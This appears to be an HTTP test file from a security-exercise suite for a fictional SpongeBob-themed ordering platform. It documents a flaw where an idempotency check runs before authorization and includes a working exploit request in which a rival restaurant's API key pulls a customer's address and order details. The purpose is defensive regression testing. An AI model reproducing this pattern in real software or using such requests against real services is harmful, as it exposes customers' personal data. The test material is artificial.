# @import ../_imports.http

# =============================================================================
# VULNERABILITY: R03 Failed Update Leaks Order Data (validation before authorization)
# =============================================================================
#
# DESCRIPTION:
#   The update_order_status() handler performs an idempotency check BEFORE
#   authorization. When the requested status matches the current status, it
#   returns a "rejection" response that includes the full order data. This
#   check happens before any ownership verification.
#
# ATTACK SCENARIO:
#   Plankton (Chum Bucket owner):
#   1. Guesses that order ID 1 exists at Krusty Krab
#   2. Sends PATCH /orders/1/status with status=created
#   3. If order is in "created" state, handler returns rejection with full order data
#   4. Plankton learns customer name, delivery address, order total, items
#
# IMPACT:
#   Order data disclosure. Any authenticated user can enumerate orders across
#   the entire platform by triggering validation errors.
#
# STATUS: VULNERABLE in v305 (exploit succeeds)
#         When fixed (v306+), this test should be excluded.
# =============================================================================

# =============================================================================
# SETUP: Create an order at Krusty Krab
# =============================================================================

### Seed the database with fresh state and create customer order
# @name setup
{{
  await platform.seed();
  await platform.seedCredits("spongebob", 100);
}}
# @ucskip
# @tag orders, r03, v305, vulnerable
GET /menu


### SpongeBob creates a cart
# @name spongebob_cart
# @forceRef setup
{{
  const cookie = await auth.login("spongebob");
  exports.spongebobCookie = cookie;
}}
# @tag orders, r03, v305, vulnerable
POST /cart?restaurant_id=1
Cookie: {{spongebobCookie}}

@cart_id = {{$(response).field("cart_id")}}


### Add item to cart
# @name add_item
# @forceRef spongebob_cart
# @tag orders, r03, v305, vulnerable
POST /cart/{{cart_id}}/items
Cookie: {{spongebobCookie}}
Content-Type: application/json

{ "item_id": 5 }


### Checkout - creates order in "created" state
# @name spongebob_order
# @forceRef add_item
# @tag orders, r03, v305, vulnerable
POST /cart/{{cart_id}}/checkout
Cookie: {{spongebobCookie}}
Content-Type: application/json

{ "delivery_address": "124 Conch Street" }

@target_order_id = {{$(response).field("order_id")}}


# =============================================================================
# EXPLOIT: Chum Bucket leaks order data via failed update
# =============================================================================

### EXPLOIT: Plankton tries to set order to its current state (created)
# The idempotency check runs BEFORE authorization and returns order data
# @name exploit
# @forceRef spongebob_order
# @tag orders, r03, v305, vulnerable
PATCH /orders/{{target_order_id}}/status
X-API-Key: {{auth.restaurant("chum_bucket")}}
Content-Type: application/x-www-form-urlencoded

status=created

# VULNERABLE: Exploit succeeds - order data leaked in "rejection" response
?? js $(response).isOk() == true
?? js $(response).field("updated") == false
?? js $(response).field("order_id") != null
?? js $(response).field("delivery_address") != null
